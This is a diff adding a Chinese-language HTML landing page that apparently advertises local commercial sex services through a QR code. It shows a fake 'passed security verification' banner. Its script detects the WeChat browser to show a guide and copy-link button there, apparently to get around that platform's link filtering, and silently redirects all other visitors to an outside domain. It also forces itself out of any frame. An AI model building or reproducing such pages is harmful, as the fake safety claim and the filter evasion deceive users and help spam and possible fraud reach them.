@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>用抖音点击（长按）下方二维码识别</title>
+    <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
+    
+    <style type="text/css">
+        /* 重置样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #eee;
+            color: #000;
+            font-size: 16px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding-top: 45px;
+        }
+
+        /* 顶部安全验证条 */
+        #safety {
+            width: 100%;
+            height: 45px;
+            background: #e8fef2;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .icon {
+            width: 26px;
+            height: 26px;
+            background: url("/assets/img/renzheng.png") no-repeat center;
+            background-size: contain;
+            margin: 0 10px;
+            flex-shrink: 0;
+        }
+
+        .text {
+            color: rgb(7, 193, 96);
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        /* 主内容区域 */
+        .code-box {
+            background-color: #fff;
+            margin: 20px;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            word-break: break-all;
+        }
+
+        .code-title {
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        .code-qrcode {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .code-qrcode img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .code-qrcode div {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        /* 微信引导页面样式 */
+        .wechat-guide {
+            display: none; /* 默认隐藏 */
+            background-color: #fff;
+            margin: 20px;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .guide-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .guide-step {
+            margin-bottom: 25px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #007bff;
+        }
+
+        .step-number {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background: #007bff;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .step-content {
+            display: inline-block;
+            vertical-align: top;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        /* 引导图片样式 */
+        .guide-images {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .guide-images img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin: 5px 0;
+            display: block;
+        }
+
+        .copy-button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .copy-button:hover {
+            background: #218838;
+        }
+
+        .copy-button:active {
+            transform: scale(0.98);
+        }
+
+        /* 加载提示 */
+        .loading-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+            transition: color 0.3s ease;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 480px) {
+            .code-box, .wechat-guide {
+                margin: 10px;
+                padding: 20px 15px;
+            }
+            
+            .guide-title {
+                font-size: 18px;
+            }
+            
+            .step-content {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 顶部安全验证提示 -->
+    <div id="safety">
+        <div class="icon"></div>
+        <div class="text">二维码已通过安全验证（外部🔗请点继续访问）</div>
+    </div>
+
+    <!-- 普通二维码页面（非微信浏览器显示） -->
+    <div class="code-box" id="qrcode-page">
+        <div class="code-title">在抖音长按（点击）下方二维码识别<br>同城附近柯阅 25以下勿扰…</div>
+        
+        <div class="code-qrcode">
+            <img src="./qer.png" alt="二维码">
+            <div>只进入身体，不进入生活 有门槛！同城约炮，</div>
+        </div>
+        
+        <div class="loading-text">正在识别浏览器类型，即将跳转...</div>
+    </div>
+
+    <!-- 微信引导页面（微信浏览器显示） -->
+    <div class="wechat-guide" id="wechat-guide">
+        <div class="guide-title">请按以下步骤操作</div>
+        
+        <!-- 引导图片（包含第一步和第二步说明） -->
+        <div class="guide-images">
+            <img src="./guide1.png" alt="第一步引导图" onerror="this.style.display='none'">
+            <img src="./guide2.png" alt="第二步引导图" onerror="this.style.display='none'">
+        </div>
+        
+        <!-- 第三步 -->
+        <div class="guide-step">
+            <span class="step-number">3</span>
+            <div class="step-content">
+                <strong>小妹介绍套餐，你想要的都有</strong><br>
+                点击加入同城修车
+            </div>
+        </div>
+        
+        <button class="copy-button" onclick="copyLink()">
+            右上角无法打开时，点击此处复制链接
+        </button>
+    </div>
+
+    <script>
+        // 配置跳转域名变量 - 统一跳转域名
+        var targetUrl = "http://www.52484.com"
+        // 检测浏览器类型并处理
+        function detectBrowserAndRedirect() {
+            var ua = navigator.userAgent.toLowerCase();
+            var qrcodePage = document.getElementById('qrcode-page');
+            var wechatGuide = document.getElementById('wechat-guide');
+            
+            if (ua.indexOf('micromessenger') !== -1) {
+                // 微信浏览器 - 显示引导页面，不跳转
+                console.log('检测到微信浏览器，显示引导页面');
+                
+                if (qrcodePage) qrcodePage.style.display = 'none';
+                if (wechatGuide) wechatGuide.style.display = 'block';
+                
+            } else {
+                // 其他浏览器 - 显示二维码页面并跳转到统一域名
+                console.log('检测到其他浏览器，跳转到统一域名');
+                
+                if (wechatGuide) wechatGuide.style.display = 'none';
+                if (qrcodePage) qrcodePage.style.display = 'flex';
+                
+                // 立即跳转到统一域名
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 1000);
+            }
+        }
+        
+        // 复制链接功能
+        function copyLink() {
+            var textArea = document.createElement('textarea');
+            textArea.value = targetUrl;
+            document.body.appendChild(textArea);
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                alert('链接已复制到剪贴板');
+            } catch (err) {
+                alert('复制失败，请手动复制链接');
+            }
+            
+            document.body.removeChild(textArea);
+        }
+        
+        // 页面加载完成后执行
+        document.addEventListener('DOMContentLoaded', function() {
+            detectBrowserAndRedirect();
+        });
+        
+        // 防止页面被嵌入iframe
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
+    </script>
+</body>
+</html>
